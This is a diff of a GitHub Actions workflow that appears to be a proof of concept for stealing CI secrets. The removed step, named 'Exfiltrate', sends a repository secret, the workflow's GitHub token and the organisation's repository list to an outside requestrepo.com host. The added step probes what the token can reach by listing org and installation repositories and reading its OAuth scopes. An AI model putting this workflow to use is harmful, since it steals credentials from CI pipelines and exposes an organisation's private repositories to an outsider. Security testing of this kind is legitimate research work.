@@ -9,13 +9,19 @@ jobs:
   extract:
     runs-on: ubuntu-latest
     steps:
-      - name: Exfiltrate
+      - name: Check token permissions
         env:
-          SECRET: ${{ secrets.TMP_SECRET }}
           GH_TOKEN: ${{ github.token }}
         run: |
-          REPOS=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
-            "https://api.github.com/orgs/cybxis-ent-org1/repos?per_page=100" | jq -c '[.[].name]')
+          # Check what the token can actually access
+          echo "--- All org repos ---"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/orgs/cybxis-ent-org1/repos?per_page=100" | jq -c '[.[].name]'
 
-          curl -s -X POST https://mzdbtd6e.requestrepo.com \
-            -d "secret=$SECRET&repos=$REPOS&token=$GH_TOKEN"
+          echo "--- Token scopes ---"
+          curl -sI -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/repos/cybxis-ent-org1/poc-secret-exfil" | grep -i x-oauth
+
+          echo "--- Installation repos ---"
+          curl -s -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/installation/repositories?per_page=100" | jq -c '[.repositories[].full_name]'
